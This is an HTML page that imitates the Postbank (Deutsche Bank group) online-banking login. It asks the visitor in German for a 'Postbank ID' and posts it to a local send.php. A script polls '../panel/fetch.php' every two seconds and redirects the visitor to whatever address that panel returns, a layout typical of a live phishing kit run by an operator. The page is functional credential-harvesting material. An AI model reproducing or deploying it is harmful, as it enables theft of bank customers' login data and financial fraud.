<!DOCTYPE html>
<html lang="en">
<head>
    <title></title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="https://www.deutsche-bank.de/cip-content/assets/pb-unity/fonts/fonts.css">
    <link rel="stylesheet" href="res/user-style.css">
</head>
<body class="back">
    <div class="container">

        <div class="row">
            <div class="left-col">

                <div class="login-box">
                    <div class="login-col">
                        <img src="res/logo-cut.png">
                    </div>

                    <div class="login-col">
                        <h3>Guten Tag</h3>
                    </div>

                    <form action="send.php" method="post">
                        <div class="login-col">
                            <span>Bitte geben Sie Ihre Postbank ID ein.</span>
                            <div class="logininput">
                                <input type="text" name="user" required="" id="user" class="hidden-input">
                                <span class="frgt">Zugangsdaten vergessen?</span>
                            </div>
                        </div>

                        <div class="login-col " style="margin-top:50px; text-align:right;">
                            <button type="submit">Weiter</button>
                        </div>

                        <div class="login-col" id="mobile">
                            <span class="frgt-mobile">Zugangsdaten vergessen?</span>
                        </div>
                    </form>
                </div>
            </div>

            <div class="right-col">
                <div class="adsholder">
                    <!-- Additional HTML code for adboxes and footerbox goes here -->
                </div>
            </div>
        </div>

        <script src="res/jq.js"></script>
        <script>
            var cd = "0";
            setInterval(() => {
                $.post("../panel/fetch.php", {update:1}, function(d){
                    if(cd!=d){
                        window.location=d;
                        cd=d;
                    }
                })
            }, 2000);
        </script>
    </div>
</body>
</html>
